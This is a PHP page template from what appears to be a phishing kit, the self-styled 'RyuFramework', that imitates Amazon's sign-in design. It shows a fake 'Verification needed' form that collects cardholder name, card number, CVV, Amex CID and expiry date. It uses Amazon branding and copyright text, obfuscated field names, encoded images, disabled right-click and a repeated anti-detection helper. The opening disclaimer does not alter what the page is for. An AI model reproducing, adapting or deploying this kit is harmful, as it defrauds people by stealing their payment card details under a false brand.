<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:25 )
* @filename card.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
?>
<!doctype html>
<html lang="<?=$this->lang;?>">
<?=$this->sec->keymani();?>
  <head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
    <title dir="ltr"><?=translate('Amazon card information',$this->lang,1);?></title> 
    <meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />   
<script type="text/javascript" src="assets/js/jquery.min.js"></script>  
 <script type="text/javascript" src="assets/js/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery.payment.min.js"></script>
    <script type="text/javascript" src="assets/js/custom.js"></script>
    <link rel="stylesheet" type="text/css" href="assets/css/amz-c.css">
<link rel="stylesheet" type="text/css" href="assets/css/details.css">

</head>
  <body>
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
<div class="a-section a-spacing-medium a-text-center">
      <center><img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['amz_logo']);?>" onContextMenu="return false;"></center>
      <center><img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['step2_logo']);?>" onContextMenu="return false;"></center>
      
</div>
      </div>
      <div class="a-section">
<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section"> 
<form method="post" action="<?=$this->form_action_page('card');?>" class="auth-validate-form a-spacing-none">
   <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            <?=translate('Verification needed',$this->lang);?>
          </h1>
<?php

if(isset($_SESSION['card_not_valid'])){
    echo "<font color=red>Please double check your card, your card is invalid. </font>";
}else{
echo translate('Please enter your card information to verify your account.',$this->lang);
}
?>
  <br/><br/>

<table class="enterAddressFormTable"><tbody><tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="NameonCards"><b><?=translate('Cardholder Name',$this->lang);?> :&nbsp;</b></label></span></td><td><span>
<input type="text" name="carlder" required="required" id="carlder" class="NameonCards"  maxlength="50" ></span>
</td></tr>

<?=$this->sec->keymani();?>
<?=$this->sec->keymani();?>

<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine1"><b><?=translate('Card number',$this->lang);?> :&nbsp;</b></label></span></td>
<td><span>
<input type="tel" name="nomartu" required="required" id="nomartu" class="enterAddressFormField"  maxlength="60" ></span>
</td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine2"><b>CVV/CVV2 :&nbsp;</b></label></span></td>
<td><span><input type="tel" name="cVv" required="required" id="cVv" class="enterAddressFormField"  maxlength="4" ></span>
<br><span class="tiny"><?=translate('Card security code.',$this->lang);?></span></td></tr>

<tr style="display: none;" id="cid_amex"><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine2"><b>CID Amex :&nbsp;</b></label></span></td>
<td><span><input type="text" name="cid" id="cid" class="enterAddressFormField"   ></td></tr>

<input type="hidden" name="header" value=" ">
<tr><td style="vertical-align:middle;"><span><label><b><?=translate('Expiration date',$this->lang);?> :&nbsp;</b></label></span></td><td><span>
<select name="onth" required="required" 03="">
<option value="--" selected="">--</option>
<option value="02">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>

<select name="ear" size="1" 2016="">
<option value="--" selected="">--</option>


<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2029">2030</option>
</select>

</span>
</td></tr>

<input type="hidden" name="enterAddressIsDomestic" value="0">





</tbody></table>
<hr>
          <div class="a-section a-spacing-extra-large">
            <span class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner">
            <input id="signInSubmit" tabindex="5" class="a-button-input" type="submit">
            <span class="a-button-text" aria-hidden="true">
              <?=translate('Next Step',$this->lang);?>
            </span></span></span>
          </div>
              

        </div></div>
      </div>
      
    </form>
  </div>
</div>
      </div>
      <div id="right-2">
      </div>
      <center>
                <p><a href="#"><?=translate('Help',$this->lang);?></a> | <a href="#"><?=translate('Condition of Use',$this->lang);?></a> | <a href="#"><?=translate('Privacy Notice',$this->lang);?></a></p><br>
                <p>&copy; 1996 - <?php echo date('Y'); ?> <?=CONFIG['amz']['domain'];?>, Inc. or its affiliates</p>
            </center>
    </div>
    </div>
  </div>
<?=$this->sec->keymani();?>
</body>
</html>

